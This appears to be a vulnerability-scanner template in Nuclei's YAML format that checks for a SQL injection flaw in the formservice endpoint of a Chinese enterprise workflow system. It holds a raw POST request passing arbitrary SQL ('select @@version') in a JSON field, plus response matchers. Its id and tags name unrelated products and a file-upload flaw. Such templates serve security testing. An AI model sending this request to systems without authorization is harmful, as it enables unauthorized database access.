id: yongyouOA-formservice-sql

info:
  name: 时空智友企业流程化管控系统formservice存在SQL注入漏洞
  author: cnaq 
  severity: critical
  description: 时空智友企业流程化管控系统formservice存在SQL注入漏洞
  reference: 
    - https://github.com/wy876/POC/blob/main/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E6%B5%81%E7%A8%8B%E5%8C%96%E7%AE%A1%E6%8E%A7%E7%B3%BB%E7%BB%9Fformservice%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: wanhu,OA,file,upload

requests:
  - raw:
      - |
        POST /formservice?service=workflow.sqlResult HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
        Connection: keep-alive
        Content-Type: application/json
        Accept-Encoding: gzip
        Content-Length: 50

        {"params":{"a":"11"},"sql":"select @@version"}

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - '200'
      - type: regex
        part: body
        regex:
          - 'SQL'
          - '\d+\.\d+\.\d+'
        condition: or